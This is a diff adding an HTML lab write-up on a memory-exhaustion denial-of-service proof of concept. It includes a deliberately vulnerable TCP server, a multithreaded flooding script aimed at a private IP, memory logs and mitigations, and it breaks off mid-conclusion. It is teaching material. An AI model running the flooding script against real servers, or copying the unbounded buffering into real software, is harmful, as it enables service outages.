@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Memory Exhaustion Lab - Port 1111</title>
+<style>
+  body {
+    font-family: "Courier New", Courier, monospace;
+    background-color: #1e1e1e;
+    color: #d4d4d4;
+    padding: 20px;
+  }
+  h1, h2, h3 {
+    color: #569cd6;
+  }
+  h1 { font-size: 2em; margin-bottom: 0.2em; }
+  h2 { font-size: 1.5em; margin-top: 1em; }
+  h3 { font-size: 1.2em; margin-top: 0.8em; }
+  pre {
+    background-color: #252526;
+    color: #d4d4d4;
+    padding: 15px;
+    border-radius: 5px;
+    overflow-x: auto;
+  }
+  .success { color: #6a9955; }
+  .failed { color: #f44747; }
+  .info { color: #9cdcfe; }
+  .warning { color: #ce9178; }
+</style>
+</head>
+<body>
+
+<h1>Memory Exhaustion Lab - Port 1111</h1>
+
+<h2>Overview</h2>
+<p>This lab demonstrates a <strong>proof-of-concept (PoC) memory exhaustion attack</strong> on a TCP application running on port 1111. The target application <strong>accepts external traffic without rate limiting</strong>, meaning an attacker can overwhelm the server if it buffers all received payloads in memory.</p>
+
+<ul>
+<li>No rate limiting</li>
+<li>No payload size checks</li>
+<li>No concurrent connection limits</li>
+</ul>
+
+<p>This PoC uses two scripts:</p>
+<ol>
+<li><strong>app.py</strong> – a vulnerable server that listens on port 1111 and stores all incoming data in memory.</li>
+<li><strong>attacker.py</strong> – a client script that sends large amounts of traffic to exhaust server memory.</li>
+</ol>
+
+<p>For demonstration, memory increased ~33% incrementally. Full exhaustion possible depending on RAM/swap.</p>
+
+<hr>
+
+<h2>app.py (Vulnerable Server)</h2>
+<pre>
+import socket
+
+HOST = "0.0.0.0"
+PORT = 1111
+
+# Global buffer to store all incoming data
+data_buffer = []
+
+def run_server():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    s.bind((HOST, PORT))
+    s.listen(5)
+
+    print(f"[+] Memory-stress server listening on {HOST}:{PORT}")
+
+    while True:
+        conn, addr = s.accept()
+        print(f"[+] Connection from {addr}")
+        try:
+            while True:
+                # Read large chunks to fill memory quickly
+                chunk = conn.recv(10*1024*1024)  # 10 MB
+                if not chunk:
+                    break
+                # Store chunk in memory
+                data_buffer.append(chunk)
+        except Exception as e:
+            print(f"[-] Error with {addr}: {e}")
+        conn.close()
+
+if __name__ == "__main__":
+    run_server()
+</pre>
+
+<hr>
+
+<h2>attacker.py (Client Memory Stress)</h2>
+<pre>
+import socket
+import threading
+import time
+
+TARGET_IP = "192.168.209.138"
+TARGET_PORT = 1111
+
+NUM_THREADS = 40         # increased threads
+PAYLOAD_MB = 50          # 50 MB per thread
+CHUNK_SIZE = 1024*1024   # 1 MB chunks
+DELAY_BETWEEN_THREADS = 0.4
+KEEP_CONNECTION_OPEN = 5
+
+payload_chunk = b"A" * CHUNK_SIZE
+print_lock = threading.Lock()
+success = 0
+failed = 0
+
+def send_payload(i):
+    global success, failed
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((TARGET_IP, TARGET_PORT))
+
+        for _ in range(PAYLOAD_MB):
+            s.sendall(payload_chunk)
+            time.sleep(0.01)
+
+        time.sleep(KEEP_CONNECTION_OPEN)
+        s.close()
+
+        with print_lock:
+            success += 1
+            print(f"<span class='success'>[+] Thread {i} done (success={success}, failed={failed})</span>")
+    except Exception as e:
+        with print_lock:
+            failed += 1
+            print(f"<span class='failed'>[-] Thread {i} failed: {e} (success={success}, failed={failed})</span>")
+
+threads = []
+for i in range(NUM_THREADS):
+    t = threading.Thread(target=send_payload, args=(i,))
+    threads.append(t)
+    t.start()
+    time.sleep(DELAY_BETWEEN_THREADS)
+
+for t in threads:
+    t.join()
+
+print(f"\n=== Test complete: {success} success, {failed} failed ===")
+</pre>
+
+<hr>
+
+<h2>Status Before Execution</h2>
+<pre>
+root@test-server:/home/dipesh/DOS# python3 app.py
+[+] Vulnerable server listening on 0.0.0.0:1111
+
+# Check port
+root@test-server:/home/dipesh/DOS# netstat -ltpn | grep 1111
+tcp        0      0 0.0.0.0:1111            0.0.0.0:*               LISTEN      17496/python3
+
+root@test-server:/home/dipesh/DOS# lsof -i :1111
+COMMAND   PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
+python3 17496 root    3u  IPv4  96310      0t0  TCP *:1111 (LISTEN)
+
+# Memory
+root@test-server:/home/dipesh# free -m
+               total        used        free      shared  buff/cache   available
+Mem:            3867        1684         663          29        1831        2183
+Swap:           3865           0        3865
+
+# Disk
+root@test-server:/home/dipesh# df -h
+Filesystem      Size  Used Avail Use% Mounted on
+tmpfs           387M  2.0M  385M   1% /run
+/dev/sda2       147G   12G  128G   9% /
+</pre>
+
+<p>Available RAM: ~2.1 GB. Swap: 3.8 GB → ~6 GB total memory potential.</p>
+
+<hr>
+
+<h2>Continuous Memory Monitoring</h2>
+<pre>
+watch -n 1 "ps -o pid,comm,%mem,rss,vsz -p \$(lsof -ti :1111) | tee -a mem_log.txt"
+</pre>
+
+<hr>
+
+<h2>After Execution of attacker.py</h2>
+<pre>
+[+] Thread 0 done (success=1, failed=0)
+[+] Thread 1 done (success=2, failed=0)
+[-] Thread 32 failed: [Errno 104] Connection reset by peer (success=14, failed=1)
+[-] Thread 14 failed: [Errno 110] Connection timed out (success=23, failed=4)
+...
+=== Test complete: 25 success, 15 failed ===
+</pre>
+
+<p>Memory usage over time (incremental increase):</p>
+<pre>
+PID COMMAND         %MEM   RSS    VSZ
+2504 python3          0.2 11044  20744
+2504 python3          6.7 267300 287372
+2504 python3          8.0 318500 338588
+2504 python3         32.6 1291556 1311716
+</pre>
+
+<hr>
+
+<h2>Explanation of Results</h2>
+<ul>
+<li><span class="failed">Thread 32 failed: [Errno 104]</span> → Server closed connections due to overload.</li>
+<li><span class="failed">Thread 14 failed: [Errno 110]</span> → TCP backlog exceeded; OS limited connections.</li>
+<li>Linux TCP backlog default low (usually 128). Increase with:</li>
+<pre>sysctl -w net.core.somaxconn=1024
+ulimit -n 65535</pre>
+<li>RSS = actual RAM used. VSZ = total addressable memory including swap.</li>
+<li>Data sent per thread = PAYLOAD_MB × CHUNK_SIZE. Total memory ~ sum of all thread payloads retained in <code>data_buffer</code>.</li>
+</ul>
+
+<hr>
+
+<h2>Solution / Mitigation</h2>
+<ul>
+<li>Rate limiting – prevent unlimited connections per second.</li>
+<li>Payload size checks – reject overly large messages.</li>
+<li>Limit concurrent connections – do not allow hundreds simultaneously.</li>
+<li>Streaming / discarding – avoid unbounded memory storage; process incrementally.</li>
+<li>Monitor memory usage – alert when usage crosses thresholds.</li>
+</ul>
+
+<p><strong>Conclusion:</strong> This lab demonstrates that a TCP server without proper resource management
